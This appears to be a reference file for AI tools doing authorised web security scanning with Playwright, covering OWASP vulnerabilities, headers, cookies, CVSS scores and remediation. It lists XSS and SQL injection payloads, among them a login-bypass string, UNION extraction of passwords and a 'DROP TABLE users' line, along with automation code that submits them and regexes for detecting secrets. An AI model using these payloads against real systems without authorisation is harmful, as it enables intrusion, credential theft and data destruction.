# Web Security Patterns

This document contains web security knowledge for AI tools performing DAST (Dynamic Application Security Testing) using Playwright.

## OWASP Top 10 Web Vulnerabilities

### 1. Cross-Site Scripting (XSS) - CWE-79

**Description:** Untrusted data sent to web browser without validation/escaping, allowing attackers to execute malicious scripts.

**Types:**
- **Reflected XSS:** Payload in URL/form echoed back immediately
- **Stored XSS:** Payload saved in database, rendered later
- **DOM-based XSS:** Vulnerability in client-side JavaScript

**Test Payloads:**
```javascript
// Basic script tag
<script>alert('XSS')</script>

// Image with error handler
<img src=x onerror=alert('XSS')>

// SVG with onload
<svg/onload=alert('XSS')>

// JavaScript protocol
javascript:alert('XSS')

// Event handler in attribute
<input onfocus=alert('XSS') autofocus>

// String breaking
'-alert('XSS')-'
"-alert('XSS')-"

// HTML entity encoding bypass
&lt;script&gt;alert('XSS')&lt;/script&gt;

// Template literal
${alert('XSS')}

// Polyglot payload
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```

**Detection:**
- Submit payload to input field
- Check if payload appears unescaped in response HTML
- Check if JavaScript executes (dialog appears, DOM mutation)
- Look for reflected user input in `<script>` tags, event handlers, URLs

**Remediation:**
- HTML-encode output: `&lt;` for `<`, `&gt;` for `>`, `&quot;` for `"`
- Use Content-Security-Policy header
- Use framework auto-escaping (React, Vue, Angular)
- Validate input against allowlist

**References:**
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)

---

### 2. SQL Injection (SQLi) - CWE-89

**Description:** Attacker inserts malicious SQL code into queries, potentially reading/modifying database data.

**Test Payloads:**
```sql
-- Authentication bypass
' OR '1'='1
' OR 1=1--
admin'--
admin' #

-- UNION-based extraction
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT username, password FROM users--

-- Boolean-based blind
' AND '1'='1
' AND '1'='2

-- Time-based blind
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
'; pg_sleep(5)--

-- Stacked queries
'; DROP TABLE users--
'; INSERT INTO users VALUES ('hacker', 'password')--

-- Error-based
' AND 1=CONVERT(int, (SELECT @@version))--
```

**Detection:**
- Submit payload to input field
- Look for SQL error messages in response
- Check for behavioral changes (authentication bypass, different data)
- Monitor response time (time-based blind SQLi)

**SQL Error Signatures:**
```
SQL syntax error
mysql_fetch_array()
mysql_num_rows()
ORA-01756: quoted string not properly terminated
PostgreSQL query failed
ODBC SQL Server Driver
Microsoft OLE DB Provider for SQL Server
Unclosed quotation mark
SQLite3::SQLException
```

**Remediation:**
- Use parameterized queries (prepared statements)
- Never concatenate user input into SQL
- Use ORM with parameterization (SQLAlchemy, Hibernate)
- Escape special characters if parameterization not possible
- Principle of least privilege (limited DB permissions)

**References:**
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

---

### 3. Cross-Site Request Forgery (CSRF) - CWE-352

**Description:** Attacker tricks victim into submitting state-changing request using victim's authentication.

**Detection:**
- Find forms that modify state (POST, PUT, DELETE)
- Check for CSRF token in hidden input field
- Check for CSRF token in request headers
- Verify SameSite cookie attribute

**CSRF Token Patterns:**
```html
<!-- Hidden input field -->
<input type="hidden" name="csrf_token" value="...">
<input type="hidden" name="_token" value="...">
<input type="hidden" name="authenticity_token" value="...">

<!-- Meta tag -->
<meta name="csrf-token" content="...">

<!-- Header -->
X-CSRF-Token: ...
X-XSRF-Token: ...
```

**Remediation:**
- Use anti-CSRF tokens (synchronizer token pattern)
- Set SameSite cookie attribute (Strict or Lax)
- Verify Origin/Referer headers
- Require re-authentication for sensitive actions
- Use custom headers (AJAX requests)

**References:**
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

### 4. Security Headers - CWE-693

**Description:** Missing HTTP security headers expose application to attacks.

**Required Headers:**

#### Content-Security-Policy (CSP)
Prevents XSS by restricting resource sources.

**Good Examples:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'
```

**Bad Examples:**
```
Content-Security-Policy: default-src *  # Too permissive
Content-Security-Policy: script-src 'unsafe-inline'  # Allows inline scripts
```

**Detection:** Header missing or contains `'unsafe-inline'`, `'unsafe-eval'`, or `*`

---

#### X-Frame-Options / frame-ancestors
Prevents clickjacking attacks.

**Good Examples:**
```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
```

**Detection:** Both headers missing

---

#### X-Content-Type-Options
Prevents MIME-sniffing attacks.

**Good Example:**
```
X-Content-Type-Options: nosniff
```

**Detection:** Header missing

---

#### Strict-Transport-Security (HSTS)
Forces HTTPS connections.

**Good Example:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Detection:** Header missing on HTTPS responses

---

#### Referrer-Policy
Controls referrer information leakage.

**Good Examples:**
```
Referrer-Policy: no-referrer
Referrer-Policy: strict-origin-when-cross-origin
```

**Bad Example:**
```
Referrer-Policy: unsafe-url  # Leaks full URL
```

**Detection:** Header missing or set to `unsafe-url`

---

#### X-XSS-Protection
Legacy XSS filter (deprecated, CSP preferred).

**Good Example:**
```
X-XSS-Protection: 0  # Disable (use CSP instead)
```

**Note:** Can cause security issues in older browsers. Use CSP instead.

---

### 5. Cookie Security - CWE-614, CWE-1004

**Description:** Insecure cookie configuration allows theft or tampering.

**Required Flags:**

#### Secure Flag
Ensures cookie only sent over HTTPS.

**Detection:** Cookie without `Secure` flag on HTTPS site

---

#### HttpOnly Flag
Prevents JavaScript access to cookie (XSS mitigation).

**Detection:** Session/auth cookie without `HttpOnly` flag

---

#### SameSite Flag
Protects against CSRF attacks.

**Values:**
- `Strict` - Cookie never sent in cross-site requests (strongest)
- `Lax` - Cookie sent on top-level navigation (GET only)
- `None` - Cookie sent in all cross-site requests (requires `Secure`)

**Detection:** Session/auth cookie without `SameSite` attribute

---

**Example Secure Cookie:**
```
Set-Cookie: session_id=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
```

**References:**
- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

### 6. Sensitive Data Exposure - CWE-200

**Description:** Application exposes sensitive information in client-side code, URLs, or error messages.

**Sensitive Data Patterns:**

```python
# Email addresses
r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'

# Social Security Numbers
r'\b\d{3}-\d{2}-\d{4}\b'

# Credit card numbers
r'\b(?:\d{4}[-\s]?){3}\d{4}\b'

# Phone numbers
r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'

# API keys
r'api[_-]?key\s*[:=]\s*["\']?[\w-]{20,}["\']?'

# AWS keys
r'AKIA[0-9A-Z]{16}'

# GitHub tokens
r'gh[pousr]_[0-9a-zA-Z]{36}'

# Private keys
r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----'

# Hardcoded passwords
r'password\s*[:=]\s*["\']?[\w@#$%^&*!]{8,}["\']?'

# JWT tokens
r'eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*'

# Internal IPs
r'\b10\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
r'\b172\.(1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}\b'
r'\b192\.168\.\d{1,3}\.\d{1,3}\b'

# Database connection strings
r'(mongodb|mysql|postgresql|postgres)://[^\s<>"{}|\\^`\[\]]*'
```

**Detection:**
- Search response body for sensitive patterns
- Check JavaScript files for hardcoded secrets
- Check HTML comments for sensitive info
- Check error messages for stack traces, paths

**Remediation:**
- Remove sensitive data from client-side code
- Use server-side sessions, not client-side tokens
- Redact sensitive data in logs and errors
- Use environment variables for secrets

---

### 7. TLS/SSL Configuration - CWE-319

**Description:** Weak HTTPS configuration allows downgrade or interception attacks.

**Security Checks:**

#### HTTP to HTTPS Redirect
**Test:** Visit `http://` version of site
**Expected:** Redirect to `https://` (301/302)
**Finding if:** No redirect (stays on HTTP)

---

#### Valid Certificate
**Test:** Check SSL certificate
**Expected:** Valid, trusted CA, not expired, correct hostname
**Finding if:** Self-signed, expired, hostname mismatch

---

#### Strong Cipher Suites
**Test:** SSL/TLS scan (requires external tool)
**Expected:** TLS 1.2+, strong ciphers only
**Finding if:** TLS 1.0/1.1 enabled, weak ciphers (RC4, DES, MD5)

---

#### HSTS Header
**Test:** Check HTTPS response headers
**Expected:** `Strict-Transport-Security` header present
**Finding if:** Header missing

---

**Remediation:**
- Force HTTPS redirect (server configuration)
- Obtain valid certificate (Let's Encrypt)
- Disable TLS 1.0/1.1, enable TLS 1.2+
- Use strong cipher suites only
- Add HSTS header with long max-age

**References:**
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)
- [Qualys SSL Labs Test](https://www.ssllabs.com/ssltest/)

---

## Playwright Security Testing Patterns

### Authentication State Management

**Save authenticated session:**
```python
# After successful login
await context.storage_state(path=".flowspec/.dast-session.json")

# Reuse session in new context
context = await browser.new_context(storage_state=".flowspec/.dast-session.json")
```

---

### XSS Detection with Playwright

**Method 1: Dialog Detection**
```python
# Listen for alert() dialogs
dialog_triggered = False

async def handle_dialog(dialog):
    global dialog_triggered
    dialog_triggered = True
    await dialog.dismiss()

page.on("dialog", handle_dialog)

# Submit XSS payload
await input_elem.fill("<script>alert('XSS')</script>")
await form.evaluate("form => form.submit()")
await page.wait_for_load_state()

if dialog_triggered:
    # XSS confirmed
    pass
```

**Method 2: Response Content Inspection**
```python
# Check if payload appears unescaped
payload = "<script>alert('XSS')</script>"
await input_elem.fill(payload)
await form.evaluate("form => form.submit()")
await page.wait_for_load_state()

content = await page.content()

# Check for unescaped payload (bad)
if payload in content:
    # Likely XSS
    pass

# Check for escaped payload (good)
if "&lt;script&gt;" in content:
    # Properly escaped
    pass
```

---

### SQL Injection Detection

**Method 1: Error Message Detection**
```python
payload = "' OR '1'='1"
await input_elem.fill(payload)
await form.evaluate("form => form.submit()")
await page.wait_for_load_state()

content = await page.content().lower()

# SQL error signatures
sql_errors = [
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "postgresql",
    "sqlite3",
    "odbc",
    "unclosed quotation",
]

for error in sql_errors:
    if error in content:
        # SQL injection confirmed
        pass
```

**Method 2: Behavioral Analysis**
```python
# Test authentication bypass
await page.locator("input[name=username]").fill("admin' OR '1'='1'--")
await page.locator("input[name=password]").fill("anything")
await page.locator("button[type=submit]").click()
await page.wait_for_load_state()

# Check if login succeeded
if "logout" in await page.content().lower():
    # Authentication bypass (SQL injection)
    pass
```

---

### Form Discovery and Testing

**Find all forms:**
```python
forms = await page.locator("form").all()

for form in forms:
    # Get form details
    action = await form.get_attribute("action")
    method = await form.get_attribute("method") or "GET"

    # Find inputs
    inputs = await form.locator("input:not([type=hidden]):not([type=submit]), textarea").all()

    for input_elem in inputs:
        input_type = await input_elem.get_attribute("type") or "text"
        name = await input_elem.get_attribute("name")

        # Test input with payloads
        await test_input(input_elem, name, payloads)
```

---

### Rate Limiting and Politeness

```python
import asyncio

# Add delay between requests
await asyncio.sleep(0.1)  # 100ms delay

# Limit concurrent pages
semaphore = asyncio.Semaphore(5)  # Max 5 concurrent

async def test_page(url):
    async with semaphore:
        page = await context.new_page()
        # Test page
        await page.close()
```

---

## CVSS Scoring for Web Vulnerabilities

### XSS - Reflected
- **CVSS:** 6.1-7.3 (Medium-High)
- **Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
- **Severity:** High

### XSS - Stored
- **CVSS:** 7.3-9.0 (High-Critical)
- **Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
- **Severity:** High to Critical

### SQL Injection
- **CVSS:** 9.8 (Critical)
- **Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Severity:** Critical

### CSRF
- **CVSS:** 6.5-8.1 (Medium-High)
- **Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
- **Severity:** High

### Missing CSP
- **CVSS:** 5.3 (Medium)
- **Severity:** Medium

### Insecure Cookie
- **CVSS:** 4.3-6.5 (Medium)
- **Severity:** Medium

---

## False Positive Patterns

**Common False Positives in DAST:**

1. **XSS in non-HTML contexts:**
   - JSON responses (Content-Type: application/json)
   - PDF downloads
   - Images, CSS, JavaScript files

2. **SQL errors in non-user input:**
   - Admin panels with intentional SQL interfaces
   - Database management tools
   - Error pages showing SQL for debugging

3. **CSRF on read-only operations:**
   - GET requests that don't modify state
   - Public APIs without authentication

4. **Missing headers on static assets:**
   - CSP on images, CSS, JS files
   - HSTS on HTTP-only assets

**Validation Before Reporting:**
- Check Content-Type header (only test HTML responses)
- Verify input actually flows to dangerous sink
- Confirm state change occurs (for CSRF)
- Check if finding is in scope (not third-party CDN)

---

## References

### OWASP Resources
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

### CWE References
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-352: CSRF](https://cwe.mitre.org/data/definitions/352.html)
- [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)

### Tools
- [Playwright](https://playwright.dev/) - Browser automation
- [OWASP ZAP](https://www.zaproxy.org/) - Web app scanner
- [Burp Suite](https://portswigger.net/burp) - Security testing platform

---

## Version History

- v0.0.251: Initial web security patterns document
